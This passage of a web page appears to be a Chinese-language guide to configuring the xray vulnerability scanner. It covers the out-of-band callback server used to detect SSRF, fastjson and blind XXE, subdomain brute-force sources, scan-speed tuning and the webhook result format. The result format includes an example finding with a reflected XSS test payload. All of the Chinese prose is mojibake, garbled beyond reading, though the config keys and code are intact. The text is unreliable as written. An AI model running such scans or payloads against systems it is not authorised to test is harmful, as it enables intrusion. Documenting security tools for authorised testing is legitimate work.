åŸºç¡€è®¤è¯ä¿¡æ¯</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="åè¿å¹³å°"><a href="#åè¿å¹³å°" class="headerlink" title="åè¿å¹³å°"></a>åè¿å¹³å°</h3><p>åè¿å¹³å°é»˜è®¤ä¸å¯ç”¨ï¼Œå› ä¸ºè¿™é‡Œé¢æœ‰äº›é…ç½®æ²¡æœ‰åŠæ³•è‡ªåŠ¨åŒ–ï¼Œå¿…é¡»ç”±äººå·¥é…ç½®å®Œæˆæ‰å¯ä½¿ç”¨ã€‚éœ€è¦åè¿å¹³å°æ‰å¯ä»¥æ£€æµ‹å‡ºæ¥çš„æ¼æ´åŒ…æ‹¬ä½†ä¸é™äºï¼š</p><ul><li>ssrf</li><li>fastjson</li><li>s2-052</li><li>xxe ç›²æ‰“</li><li>æ‰€æœ‰ä¾èµ–åè¿å¹³å°çš„ poc</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">reverse:</span><br><span class="hljs-symbol">  db_file_path:</span> <span class="hljs-string">&quot;&quot;</span>                      <span class="hljs-meta"># åè¿å¹³å°æ•°æ®åº“æ–‡ä»¶ä½ç½®, è¿™æ˜¯ä¸€ä¸ª KV æ•°æ®åº“</span><br><span class="hljs-symbol">  token:</span> <span class="hljs-string">&quot;&quot;</span>                             <span class="hljs-meta"># åè¿å¹³å°è®¤è¯çš„ Token, ç‹¬ç«‹éƒ¨ç½²æ—¶ä¸èƒ½ä¸ºç©º</span><br><span class="hljs-symbol">  http:</span><br><span class="hljs-symbol">    enabled:</span> false<br><span class="hljs-symbol">    listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <br><span class="hljs-symbol">    listen_port:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-symbol">    ip_header:</span> <span class="hljs-string">&quot;&quot;</span>                       <span class="hljs-meta"># åœ¨å“ªä¸ª http header ä¸­å– ipï¼Œä¸ºç©ºä»£è¡¨ä» REMOTE_ADDR ä¸­å–</span><br><span class="hljs-symbol">  dns:</span><br><span class="hljs-symbol">    enabled:</span> false<br><span class="hljs-symbol">    listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <br><span class="hljs-symbol">    domain:</span> <span class="hljs-string">&quot;&quot;</span>                          <span class="hljs-meta"># DNS åŸŸåé…ç½®</span><br><span class="hljs-symbol">    is_domain_name_server:</span> false        <span class="hljs-meta"># æ˜¯å¦ä¿®æ”¹äº†åŸŸåçš„ ns ä¸ºåè¿å¹³å°ï¼Œå¦‚æœæ˜¯ï¼Œé‚£ nslookup ç­‰å°±ä¸éœ€è¦æŒ‡å®š dns äº†</span><br><span class="hljs-symbol">    resolve:</span>                            <span class="hljs-meta"># DNS é™æ€è§£æè§„åˆ™</span><br>    - type: A                           <span class="hljs-meta"># A, AAAA, TXT ä¸‰ç§</span><br><span class="hljs-symbol">      record:</span> localhost<br><span class="hljs-symbol">      value:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><span class="hljs-symbol">      ttl:</span> <span class="hljs-number">60</span><br><span class="hljs-symbol">  client:</span><br><span class="hljs-symbol">    remote_server:</span> false                <span class="hljs-meta"># æ˜¯å¦æ˜¯ç‹¬ç«‹çš„è¿œç¨‹ serverï¼Œå¦‚æœæ˜¯è¦åœ¨ä¸‹é¢é…ç½®å¥½è¿œç¨‹çš„æœåŠ¡ç«¯åœ°å€</span><br><span class="hljs-symbol">    http_base_url:</span> <span class="hljs-string">&quot;&quot;</span>                   <span class="hljs-meta"># é»˜è®¤å°†æ ¹æ® ListenIP å’Œ ListenPort ç”Ÿæˆï¼Œè¯¥åœ°å€æ˜¯å­˜åœ¨æ¼æ´çš„ç›®æ ‡åè¿å›æ¥çš„åœ°å€, å½“åè¿å¹³å°å‰é¢æœ‰åä»£ã€ç»‘å®šåŸŸåã€ç«¯å£æ˜ å°„æ—¶éœ€è¦è‡ªè¡Œé…ç½®</span><br><span class="hljs-symbol">    dns_server_ip:</span> <span class="hljs-string">&quot;&quot;</span>                   <span class="hljs-meta"># å’Œ http_base_url ç±»ä¼¼ï¼Œå®é™…ç”¨æ¥è®¿é—® dns æœåŠ¡å™¨çš„åœ°å€</span><br><br></code></pre></td></tr></table></figure><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><h5 id="xrayå’Œç›®æ ‡å¯ä»¥ç”¨ipåŒå‘äº’è”"><a href="#xrayå’Œç›®æ ‡å¯ä»¥ç”¨ipåŒå‘äº’è”" class="headerlink" title="xrayå’Œç›®æ ‡å¯ä»¥ç”¨ipåŒå‘äº’è”"></a>xrayå’Œç›®æ ‡å¯ä»¥ç”¨ipåŒå‘äº’è”</h5><p>å‡è®¾ 192.168.1.2 æ˜¯ xray æ‰€åœ¨æœºå™¨çš„åœ°å€</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">reverse:</span><br>  <span class="hljs-attr">http:</span><br>    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">listen_ip:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ 192.168.1.2 æ˜¯ xray æ‰€åœ¨çš„æœºå™¨çš„åœ°å€, ä¹Ÿæ˜¯æ‰«æç›®æ ‡åè¿æ—¶æ‰€ä½¿ç”¨çš„åœ°å€ã€‚ä¹Ÿå°±æ˜¯ï¼Œç›®æ ‡å­˜åœ¨æ¼æ´çš„æ—¶å€™ï¼Œä¼šè®¿é—® <a href="http://192.168.1.2/xxxx">http://192.168.1.2/xxxx</a> æºå¸¦æ¼æ´ç»“æœå’Œæ•°æ®</p><h5 id="xray-å’Œç›®æ ‡å¯ä»¥ä½¿ç”¨-ip-åŒå‘äº’è”ï¼Œä½†-listen-çš„åœ°å€å’Œç›®æ ‡åè¿è®¿é—®çš„åœ°å€ä¸ä¸€æ ·"><a href="#xray-å’Œç›®æ ‡å¯ä»¥ä½¿ç”¨-ip-åŒå‘äº’è”ï¼Œä½†-listen-çš„åœ°å€å’Œç›®æ ‡åè¿è®¿é—®çš„åœ°å€ä¸ä¸€æ ·" class="headerlink" title="xray å’Œç›®æ ‡å¯ä»¥ä½¿ç”¨ ip åŒå‘äº’è”ï¼Œä½† listen çš„åœ°å€å’Œç›®æ ‡åè¿è®¿é—®çš„åœ°å€ä¸ä¸€æ ·"></a>xray å’Œç›®æ ‡å¯ä»¥ä½¿ç”¨ ip åŒå‘äº’è”ï¼Œä½† listen çš„åœ°å€å’Œç›®æ ‡åè¿è®¿é—®çš„åœ°å€ä¸ä¸€æ ·</h5><p>è¿™ç§æƒ…å†µç»å¸¸å‡ºç°åœ¨äº‘ä¸»æœºä¸­ï¼Œæ¯”å¦‚è…¾è®¯äº‘çš„ linux æœºå™¨ç½‘å¡åœ°å€æ—¶ 10.xxxï¼Œä½†å®é™…å…¬ç½‘å‡è®¾æ˜¯ 221.xxx</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">reverse:</span><br><span class="hljs-symbol">  http:</span><br><span class="hljs-symbol">    enabled:</span> true<br><span class="hljs-symbol">    listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><span class="hljs-symbol">  client:</span><br><span class="hljs-symbol">    http_base_url:</span> <span class="hljs-string">&quot;http://221.xxx:$&#123;port&#125;&quot;</span> <br></code></pre></td></tr></table></figure><p><code>$&#123;port&#125;</code> æ˜¯ä¸€ä¸ªé¢„å®šä¹‰çš„å®ï¼Œåœ¨è¿è¡Œæ—¶å°†è¢«æ›¿æ¢ä¸ºå®é™…ç›‘å¬çš„ç«¯å£, å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼å›ºå®šç›‘å¬çš„ç«¯å£ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">reverse:</span><br>  <span class="hljs-attr">http:</span><br>    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>    <span class="hljs-attr">listen_port:</span> <span class="hljs-number">8888</span><br>  <span class="hljs-attr">client:</span><br>    <span class="hljs-attr">http_base_url:</span> <span class="hljs-string">&quot;http://221.xxx:8888&quot;</span> <br></code></pre></td></tr></table></figure><h5 id="å•ç‹¬å¸ƒç½®åè¿å¹³å°"><a href="#å•ç‹¬å¸ƒç½®åè¿å¹³å°" class="headerlink" title="å•ç‹¬å¸ƒç½®åè¿å¹³å°"></a>å•ç‹¬å¸ƒç½®åè¿å¹³å°</h5><p>xray è‡ªå¸¦äº†ä¸€ä¸ª <code>reverse</code> å‘½ä»¤ï¼Œå¯ä»¥å¯åŠ¨åè¿å¹³å°ä½œä¸ºä¸€ä¸ªè¿œç¨‹æœåŠ¡è¿è¡Œï¼Œç»™å¤šä¸ªå®¢æˆ·ç«¯ä½¿ç”¨ã€‚</p><p>åœ¨å¯åŠ¨ä¹‹å‰ï¼Œéœ€è¦é…ç½®å¥½é…ç½®æ–‡ä»¶çš„ <code>db_file_path</code> å’Œ <code>token</code>ï¼Œå‰è€…ç”¨äºå­˜å‚¨æ•°æ®ï¼Œåè€…ç”¨äºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯é€šä¿¡çš„ç§˜é’¥ã€‚</p><p>ä¸€ä¸ªç¤ºä¾‹çš„æœåŠ¡ç«¯é…ç½®æ˜¯ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">reverse:</span><br><span class="hljs-symbol">  db_file_path:</span> <span class="hljs-string">&quot;reverse.db&quot;</span><br><span class="hljs-symbol">  token:</span> <span class="hljs-string">&quot;please_change_me_to_a_new_token&quot;</span><br><span class="hljs-symbol">  http:</span><br><span class="hljs-symbol">    listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><span class="hljs-symbol">    listen_port:</span> <span class="hljs-string">&quot;80&quot;</span><br></code></pre></td></tr></table></figure><p>ä¸ä¹‹å¯¹åº”çš„å®¢æˆ·ç«¯é…ç½®æ˜¯ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">reverse:</span><br><span class="hljs-symbol">  token:</span> <span class="hljs-string">&quot;please_change_me_to_a_new_token&quot;</span><br><span class="hljs-symbol">  client:</span><br><span class="hljs-symbol">    remote_server:</span> true<br><span class="hljs-symbol">    http_base_url:</span> <span class="hljs-string">&quot;http://YOUR_REVERSE_SERVER_IP:80&quot;</span><br></code></pre></td></tr></table></figure><p><strong>éœ€è¦å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç‰ˆæœ¬ç›¸åŒ</strong></p><h4 id="ç®¡ç†ç•Œé¢"><a href="#ç®¡ç†ç•Œé¢" class="headerlink" title="ç®¡ç†ç•Œé¢"></a>ç®¡ç†ç•Œé¢</h4><p>åè¿å¹³å°è´´å¿ƒçš„å†…ç½®äº†ä¸€ä¸ªç®¡ç†ç•Œé¢ï¼Œå¯ä»¥è®¿é—®åè¿å¹³å° http åœ°å€ï¼Œurl ä¸º <code>/cland/</code>ã€‚</p><p>åŠŸèƒ½åŒ…æ‹¬</p><ul><li>ç”Ÿæˆè‡ªå®šä¹‰ urlï¼Œå¹¶è®°å½•è®¿é—®è®°å½•</li><li>ç”Ÿæˆè‡ªå®šä¹‰åŸŸåï¼Œå¹¶è®°å½•è§£æè®°å½•</li><li>ä½¿ç”¨å¹³å°é¢„åˆ¶ payloadï¼Œè®°å½•æŠ“å–çš„æ•°æ®</li></ul><blockquote><p>mac ä¸‹çš„ docker ç”±äºç½‘ç»œç¯å¢ƒç‰¹æ®Šï¼Œå…¶å®æ— æ³•åŒå‘äº’è”ï¼Œå»ºè®®ä½¿ç”¨è¿œç¨‹éƒ¨ç½²çš„æ¨¡å¼æˆ–ä½¿ç”¨ <code>host.docker.internal</code> ä½œä¸º http_base_url çš„ host</p></blockquote><h3 id="å­åŸŸåé…ç½®"><a href="#å­åŸŸåé…ç½®" class="headerlink" title="å­åŸŸåé…ç½®"></a>å­åŸŸåé…ç½®</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">subdomain:</span><br>  <span class="hljs-attr">max_parallel:</span> <span class="hljs-number">30</span>                      <span class="hljs-comment"># å­åŸŸåæ¢æµ‹çš„å¹¶å‘åº¦</span><br>  <span class="hljs-attr">allow_recursion:</span> <span class="hljs-literal">false</span>                <span class="hljs-comment"># æ˜¯å¦å…è®¸é€’å½’æ¢æµ‹, å¼€å¯åï¼Œæ‰«æå®Œä¸€çº§åŸŸååï¼Œä¼šè‡ªåŠ¨å°†ä¸€çº§çš„æ¯ä¸ªåŸŸåä½œä¸ºæ–°çš„ç›®æ ‡</span><br>  <span class="hljs-attr">max_recursion_depth:</span> <span class="hljs-number">3</span>                <span class="hljs-comment"># æœ€å¤§å…è®¸çš„é€’å½’æ·±åº¦, 3 è¡¨ç¤º 3 çº§å­åŸŸå ä»…å½“ allow_recursion å¼€å¯æ—¶æ‰æœ‰æ„ä¹‰</span><br>  <span class="hljs-attr">web_only:</span> <span class="hljs-literal">false</span>                       <span class="hljs-comment"># ç»“æœä¸­ä»…æ˜¾ç¤ºæœ‰ web åº”ç”¨çš„, æ²¡æœ‰ web åº”ç”¨çš„å°†è¢«ä¸¢å¼ƒ</span><br>  <span class="hljs-attr">ip_only:</span> <span class="hljs-literal">false</span>                        <span class="hljs-comment"># ç»“æœä¸­ä»…å±•ç¤ºè§£æå‡º IP çš„ï¼Œæ²¡æœ‰è§£ææˆåŠŸçš„å°†è¢«ä¸¢å¼ƒ</span><br>  <span class="hljs-attr">servers:</span>                              <span class="hljs-comment"># å­åŸŸåæ‰«æè¿‡ç¨‹ä¸­ä½¿ç”¨çš„ DNS Server</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-number">8.8</span><span class="hljs-number">.4</span><span class="hljs-number">.4</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-number">223.5</span><span class="hljs-number">.5</span><span class="hljs-number">.5</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-number">223.6</span><span class="hljs-number">.6</span><span class="hljs-number">.6</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br>  <span class="hljs-attr">sources:</span><br>    <span class="hljs-attr">brute:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">main_dict:</span> <span class="hljs-string">&quot;&quot;</span>                     <span class="hljs-comment"># ä¸€çº§å¤§å­—å…¸è·¯å¾„ï¼Œä¸ºç©ºå°†ä½¿ç”¨å†…ç½®çš„ TOP 30000 å­—å…¸</span><br>      <span class="hljs-attr">sub_dict:</span> <span class="hljs-string">&quot;&quot;</span>                      <span class="hljs-comment"># å…¶ä»–çº§å°å­—å…¸è·¯å¾„ï¼Œä¸ºç©ºå°†ä½¿ç”¨å†…ç½®è¿‡çš„ TOP 100 å­—å…¸</span><br>    <span class="hljs-attr">httpfinder:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>                     <span class="hljs-comment"># ä½¿ç”¨ http çš„ä¸€äº›æ–¹å¼æ¥æŠ“å–å­åŸŸåï¼ŒåŒ…æ‹¬ js, é…ç½®æ–‡ä»¶ï¼Œhttp header ç­‰ç­‰</span><br>    <span class="hljs-attr">dnsfinder:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>                     <span class="hljs-comment"># ä½¿ç”¨ dns çš„ä¸€äº›é”™è¯¯é…ç½®æ¥æ‰¾å¯»å­åŸŸåï¼Œå¦‚åŒºåŸŸä¼ é€ï¼ˆzone transfer)</span><br>    <span class="hljs-attr">certspotter:</span>                        <span class="hljs-comment"># ä¸‹é¢çš„é€šè¿‡ api è·å–çš„äº†</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">crt:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">hackertarget:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">qianxun:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">rapiddns:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">sublist3r:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">threatminer:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">virusTotal:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><h3 id="æ£€æŸ¥æ›´æ–°é…ç½®"><a href="#æ£€æŸ¥æ›´æ–°é…ç½®" class="headerlink" title="æ£€æŸ¥æ›´æ–°é…ç½®"></a>æ£€æŸ¥æ›´æ–°é…ç½®</h3><p>æ·»åŠ å¦‚ä¸‹å³å¯ç¦ç”¨æ›´æ–°æ£€æŸ¥</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">update:</span><br>  <span class="hljs-attr">check:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h3 id="å¹¶å‘é…ç½®"><a href="#å¹¶å‘é…ç½®" class="headerlink" title="å¹¶å‘é…ç½®"></a>å¹¶å‘é…ç½®</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">parallel</span>: <span class="hljs-number">30</span> #Â æ¼æ´æ¢æµ‹çš„Â workerÂ æ•°é‡ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºåŒæ—¶æœ‰Â <span class="hljs-number">30</span>Â ä¸ªÂ POCÂ åœ¨è¿è¡Œ<br></code></pre></td></tr></table></figure><p>é»˜è®¤åŸºæœ¬è¶³å¤Ÿ</p><h2 id="é«˜çº§ç”¨æ³•"><a href="#é«˜çº§ç”¨æ³•" class="headerlink" title="é«˜çº§ç”¨æ³•"></a>é«˜çº§ç”¨æ³•</h2><h3 id="ä¼˜åŒ–æ‰«æé€Ÿåº¦"><a href="#ä¼˜åŒ–æ‰«æé€Ÿåº¦" class="headerlink" title="ä¼˜åŒ–æ‰«æé€Ÿåº¦"></a>ä¼˜åŒ–æ‰«æé€Ÿåº¦</h3><p>åœ¨ xray çš„é»˜è®¤é…ç½®ä¸­ï¼Œå½±å“æ‰«æé€Ÿåº¦çš„ä¸»è¦æœ‰ä¸¤ä¸ªå‚æ•°</p><ul><li><code>max_qps</code> æ¯ç§’æœ€å¤§è¯·æ±‚æ•°ï¼Œé»˜è®¤å€¼ä¸º 500</li><li><code>max_parallel</code> æ’ä»¶è°ƒåº¦å¹¶å‘æ•°ï¼Œé»˜è®¤å€¼ä¸º 30</li></ul><blockquote><p>å³ä½¿åˆ°äº† 2000 qpsï¼Œä¹Ÿè¿˜æ²¡æœ‰è¾¾åˆ°é…ç½®çš„æ£€æµ‹æœ€å¤§å¹¶å‘ï¼Œæ‰€ä»¥ <code>max_parallel</code> ä¸€èˆ¬æƒ…å†µä¸‹ä¸éœ€è¦ä¿®æ”¹ã€‚<br><code>max_qps</code> åœ¨éæµ‹è¯•åœºæ™¯ä¸‹ï¼Œä¹Ÿå¾ˆéš¾æ‰“æ»¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªä¼šæ”¹ä½ï¼Œé˜²æ­¢å½±å“ä¸šåŠ¡ï¼Œè€Œä¸éœ€è¦å†è°ƒé«˜ã€‚</p></blockquote><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>é™åˆ¶ xray æ‰«æé€Ÿåº¦çš„ä¸»è¦åŸå› ä¸º</p><ul><li>xray ä¸è¢«æ‰«æç›®æ ‡ä¹‹é—´çš„ç½‘ç»œæƒ…å†µ</li><li>è¢«æ‰«æç›®æ ‡çš„æ€§èƒ½ï¼›å¦åˆ™ç½‘ç»œå†å¥½ï¼Œæ‰«æé€Ÿåº¦ä¹Ÿæ— æ³•æå‡</li></ul><p>è¿™ä¸¤ç‚¹å¯ä»¥ä» <code>latency</code> å’Œ  <code>failedRatio</code> å­—æ®µè¯„ä¼°ã€‚<code>latency</code> æ¯”è¾ƒå¤§ï¼Œè¶…è¿‡ 100msï¼Œè¯´æ˜ç½‘ç»œæ¯”è¾ƒæ…¢ï¼Œæˆ–è€…è¢«æ‰«æçš„ç›®æ ‡å“åº”æ¯”è¾ƒæ…¢ã€‚<code>failedRatio</code> æ¯”è¾ƒå¤§ï¼Œè¯´æ˜ç½‘ç»œæ¯”è¾ƒå·®ï¼Œæˆ–è€…è¢«æ‰«æç›®æ ‡è´Ÿè½½é«˜è€Œå¤±å»äº†å“åº”ç­‰ã€‚</p><p>åœ¨ç½‘ç»œæƒ…å†µç¨³å®šçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è€ƒè™‘</p><ul><li>é™ä½ <code>max_qps</code>ï¼Œé˜²æ­¢ä¸šåŠ¡æ–¹è´Ÿè½½è¿‡é«˜</li><li>å…³é—­ç‰¹å®šæ¨¡å—å’Œç¦ç”¨éƒ¨åˆ† pocï¼Œå‡å°‘è¯·æ±‚é‡</li><li>ä¸è¦æ€§èƒ½æ¯”è¾ƒå·®çš„ä»£ç†ä½œä¸º xray çš„æ‰«æä»£ç†ï¼Œæ¯”å¦‚ burp çš„ä»£ç†é€šè¿‡è¯·æ±‚çš„é€Ÿåº¦åŸºæœ¬åªæœ‰å‡ å qpsï¼Œè¿™æ ·æ•´ä¸ªæ‰«æçš„ç“¶é¢ˆå°±åœ¨ burp ä¸Šäº†ã€‚</li></ul><h3 id="è‡ªå®šä¹‰POCè¯­æ³•å’Œç¼–å†™é«˜è´¨é‡POC"><a href="#è‡ªå®šä¹‰POCè¯­æ³•å’Œç¼–å†™é«˜è´¨é‡POC" class="headerlink" title="è‡ªå®šä¹‰POCè¯­æ³•å’Œç¼–å†™é«˜è´¨é‡POC"></a>è‡ªå®šä¹‰POCè¯­æ³•å’Œç¼–å†™é«˜è´¨é‡POC</h3><p><a href="https://docs.xray.cool/#/guide/poc">å®˜æ–¹æ–‡æ¡£</a></p><h2 id="webhook"><a href="#webhook" class="headerlink" title="webhook"></a>webhook</h2><p><code>--webhook-output</code></p><p>ç»Ÿä¸€çš„æ ¼å¼ä¸º:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-attr">&quot;data&quot;</span>: &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>type çš„ enum ä¸º ï¼š</p><ul><li>â€œweb_statisticâ€ web æ‰«æç»Ÿè®¡ä¿¡æ¯</li><li>â€œweb_vulnâ€ web æ¼æ´</li><li>â€œhost_vulnâ€ æœåŠ¡æ¼æ´</li><li>â€œsubdomainâ€ å­åŸŸå</li></ul><h3 id="æ¼æ´ä¿¡æ¯"><a href="#æ¼æ´ä¿¡æ¯" class="headerlink" title="æ¼æ´ä¿¡æ¯"></a>æ¼æ´ä¿¡æ¯</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;web_vuln&quot;</span>,<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;create_time&quot;</span>: <span class="hljs-number">1604736253090</span>,<br>    <span class="hljs-attr">&quot;detail&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;addr&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:9000/xss/example1.php?name=hacker&quot;</span>,<br>      <span class="hljs-attr">&quot;extra&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;param&quot;</span>: &#123;<br>          <span class="hljs-attr">&quot;key&quot;</span>: <span class="hljs-string">&quot;name&quot;</span>,<br>          <span class="hljs-attr">&quot;position&quot;</span>: <span class="hljs-string">&quot;query&quot;</span>,<br>          <span class="hljs-attr">&quot;value&quot;</span>: <span class="hljs-string">&quot;pkbnekwkjhwzabxnfjwh&quot;</span><br>        &#125;<br>      &#125;,<br>      <span class="hljs-attr">&quot;payload&quot;</span>: <span class="hljs-string">&quot;&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;&quot;</span>,<br>      <span class="hljs-attr">&quot;snapshot&quot;</span>: [<br>        [<br>          <span class="hljs-string">&quot;GET /xxx&quot;</span>,<br>          <span class="hljs-string">&quot;HTTP/1.1 200 OK&quot;</span><br>        ]<br>      ]<br>    &#125;,<br>    <span class="hljs-attr">&quot;plugin&quot;</span>: <span class="hljs-string">&quot;xss/reflected/default&quot;</span>,<br>    <span class="hljs-attr">&quot;target&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;params&quot;</span>: [],<br>      <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:9000/xss/example1.php&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>type æ˜¯ <code>web_vuln</code> æˆ– <code>host_vuln</code></li><li>snapshot æ˜¯æ¼æ´æ¢æµ‹çš„è¯·æ±‚æµï¼Œå®šä¹‰æ˜¯ <code>[][2]string</code>, å³æ¯ä¸€ç»„æœ‰ä¸¤éƒ¨åˆ†ï¼Œå¯¹åº”äºè¯·æ±‚å’Œå“åº”ã€‚å¯¹äº sql æ³¨å…¥è¿™ç§å°±ä¼šæœ‰å¤šç»„è¯·æ±‚å“åº”ã€‚</li><li>target å®é™…æ„ä¹‰ä¸å¤§, ä¸»è¦æ˜¯ detail ä¸­çš„éƒ¨åˆ†, detail 